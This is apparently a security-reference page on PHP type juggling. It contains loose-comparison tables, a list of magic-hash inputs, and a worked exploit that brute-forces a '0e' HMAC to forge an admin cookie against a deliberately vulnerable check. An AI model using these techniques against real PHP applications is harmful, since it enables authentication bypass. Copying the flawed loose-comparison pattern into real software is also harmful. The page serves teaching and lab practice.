# type juggling

> php is a loosely typed language, which means it tries to predict the programmer's intent and automatically converts variables to different types whenever it seems necessary. for example, a string containing only numbers can be treated as an integer or a float. however, this automatic conversion (or type juggling) can lead to unexpected results, especially when comparing variables using the '==' operator, which only checks for value equality (loose comparison), not type and value equality (strict comparison).


## summary

* [loose comparison](#loose-comparison)
	* [true statements](#true-statements)
	* [null statements](#null-statements)
	* [loose comparison](#loose-comparison)
* [magic hashes](#magic-hashes)
* [methodology](#methodology)
* [labs](#labs)
* [references](#references)


## loose comparison

> php type juggling vulnerabilities arise when loose comparison (== or !=) is employed instead of strict comparison (=== or !==) in an area where the attacker can control one of the variables being compared. this vulnerability can result in the application returning an unintended answer to the true or false statement, and can lead to severe authorization and/or authentication bugs.

- **loose** comparison: using `== or !=` : both variables have "the same value".
- **strict** comparison: using `=== or !==` : both variables have "the same type and the same value".

### true statements

| statement                         | output |
| --------------------------------- |:---------------:|
| `'0010e2'   == '1e3'`             | true |
| `'0xabcdef' == ' 0xabcdef'`       | true (php 5.0) / false (php 7.0) |
| `'0xabcdef' == '     0xabcdef'`   | true (php 5.0) / false (php 7.0) |
| `'0x01'     == 1`       		    | true (php 5.0) / false (php 7.0) |
| `'0x1234ab' == '1193131'`         | true (php 5.0) / false (php 7.0) |
| `'123'  == 123`                   | true |
| `'123a' == 123`                   | true |
| `'abc'  == 0`                     | true |
| `'' == 0 == false == null`        | true |
| `'' == 0`                         | true |
| `0  == false `                    | true |
| `false == null`                   | true |
| `null == ''`                      | true |

> php8 won't try to cast string into numbers anymore, thanks to the saner string to number comparisons rfc, meaning that collision with hashes starting with 0e and the likes are finally a thing of the past! the consistent type errors for internal functions rfc will prevent things like `0 == strcmp($_get['username'], $password)` bypasses, since strcmp won't return null and spit a warning any longer, but will throw a proper exception instead. 


[image extracted text: [image not found]]


loose type comparisons occurs in many languages:

* [mariadb](https://github.com/hakumarachi/loose-compare-tables/tree/master/results/mariadb)
* [mysql](https://github.com/hakumarachi/loose-compare-tables/tree/master/results/mysql)
* [nodejs](https://github.com/hakumarachi/loose-compare-tables/tree/master/results/nodejs)
* [php](https://github.com/hakumarachi/loose-compare-tables/tree/master/results/php)
* [perl](https://github.com/hakumarachi/loose-compare-tables/tree/master/results/perl)
* [postgres](https://github.com/hakumarachi/loose-compare-tables/tree/master/results/postgres)
* [python](https://github.com/hakumarachi/loose-compare-tables/tree/master/results/python)
* [sqlite](https://github.com/hakumarachi/loose-compare-tables/tree/master/results/sqlite/2.6.0)


### null statements

| function | statement                  | output |
| -------- | -------------------------- |:---------------:|
| sha1     | `var_dump(sha1([]));`      | null |
| md5      | `var_dump(md5([]));`       | null |


## magic hashes

>  magic hashes arise due to a quirk in php's type juggling, when comparing string hashes to integers. if a string hash starts with "0e" followed by only numbers, php interprets this as scientific notation and the hash is treated as a float in comparison operations. 

| hash | "magic" number / string    | magic hash                                    | found by / description      |
| ---- | -------------------------- |:---------------------------------------------:| -------------:|
| md4  | gh0nadhk                   | 0e096229559581069251163783434175              | [@spaze](https://github.com/spaze/hashes/blob/master/md4.md) |
| md4  | iif+htai                   | 00e90130237707355082822449868597              | [@spaze](https://github.com/spaze/hashes/blob/master/md4.md) |
| md5  | 240610708                  | 0e462097431906509019562988736854              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| md5  | qnkcdzo                    | 0e830400451993494058024219903391              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| md5  | 0e1137126905               | 0e291659922323405260514745084877              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| md5  | 0e215962017                | 0e291242476940776845150308577824              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| md5  | 129581926211651571912466741651878684928                | 06da5430449f8f6f23dfc1276f722738              | raw: ?t0d??o#??'or'8.n=? |
| sha1 | 10932435112                | 0e07766915004133176347055865026311692244      | independently found by michael a. cleverly & michele spagnuolo & rogdham |
| sha-224 | 10885164793773          | 0e281250946775200129471613219196999537878926740638594636 | [@tihanyinorbert](https://twitter.com/tihanyinorbert/status/1138075224010833921) |
| sha-256 | 34250003024812          | 0e46289032038065916139621039085883773413820991920706299695051332 | [@tihanyinorbert](https://twitter.com/tihanyinorbert/status/1148586399207178241) |
| sha-256 | tynoqhus                | 0e66298694359207596086558843543959518835691168370379069085300385 | [@chick3nman512](https://twitter.com/chick3nman512/status/1150137800324526083)

```php
<?php
var_dump(md5('240610708') == md5('qnkcdzo')); # bool(true)
var_dump(md5('aabg7xss')  == md5('aabc9rqs'));
var_dump(sha1('aarozmok') == sha1('aak1stfy'));
var_dump(sha1('aao8zkzf') == sha1('aa3off9m'));
?>
```

## methodology

the vulnerability in the following code lies in the use of a loose comparison (!=) to validate the $cookie['hmac'] against the calculated `$hash`.

```php
function validate_cookie($cookie,$key){
	$hash = hash_hmac('md5', $cookie['username'] . '|' . $cookie['expiration'], $key);
	if($cookie['hmac'] != $hash){ // loose comparison
		return false;
		
	}
	else{
		echo "well done";
	}
}
```

in this case, if an attacker can control the $cookie['hmac'] value and set it to a string like "0", and somehow manipulate the hash_hmac function to return a hash that starts with "0e" followed only by numbers (which is interpreted as zero), the condition $cookie['hmac'] != $hash would evaluate to false, effectively bypassing the hmac check.

we have control over 3 elements in the cookie:
- `$username` - username you are targeting, probably "admin"
- `$expiration` - a unix timestamp, must be in the future
- `$hmac` - the provided hash, "0"

the exploitation phase is the following:
1. prepare a malicious cookie: the attacker prepares a cookie with $username set to the user they wish to impersonate (for example, "admin"), `$expiration` set to a future unix timestamp, and $hmac set to "0".
2. brute force the `$expiration` value: the attacker then brute forces different `$expiration` values until the hash_hmac function generates a hash that starts with "0e" and is followed only by numbers. this is a computationally intensive process and might not be feasible depending on the system setup. however, if successful, this step would generate a "zero-like" hash.
	```php
	// docker run -it --rm -v /tmp/test:/usr/src/myapp -w /usr/src/myapp php:8.3.0alpha1-cli-buster php exp.php
	for($i=1424869663; $i < 1835970773; $i++ ){
		$out = hash_hmac('md5', 'admin|'.$i, '');
		if(str_starts_with($out, '0e' )){
			if($out == 0){
				echo "$i - ".$out;
				break;
			}
		}
	}
	?>
	```
3. update the cookie data with the value from the bruteforce: `1539805986 - 0e772967136366835494939987377058`
	```php
	$cookie = [
		'username' => 'admin',
		'expiration' => 1539805986,
		'hmac' => '0'
	];
	```
4. in this case we assumed the key was a null string : `$key = '';`


## labs

* [root me - php - type juggling](https://www.root-me.org/en/challenges/web-server/php-type-juggling)
* [root me - php - loose comparison](https://www.root-me.org/en/challenges/web-server/php-loose-comparison)


## references

- [(super) magic hashes - myst404 (@myst404_) - october 7, 2019](https://offsec.almond.consulting/super-magic-hash.html)
- [magic hashes - robert hansen - may 11, 2015](http://web.archive.org/web/20160722013412/https://www.whitehatsec.com/blog/magic-hashes/)
- [magic hashes – php hash "collisions" - michal špaček (@spaze) - may 6, 2015](https://github.com/spaze/hashes)
- [php magic tricks: type juggling - chris smith (@chrismsnz) - august 18, 2020](http://web.archive.org/web/20200818131633/https://owasp.org/www-pdf-archive/phpmagictricks-typejuggling.pdf)
- [writing exploits for exotic bug classes: php type juggling - tyler borland (turboborland) - august 17, 2013](http://turbochaos.blogspot.com/2013/08/exploiting-exotic-bugs-php-type-juggling.html)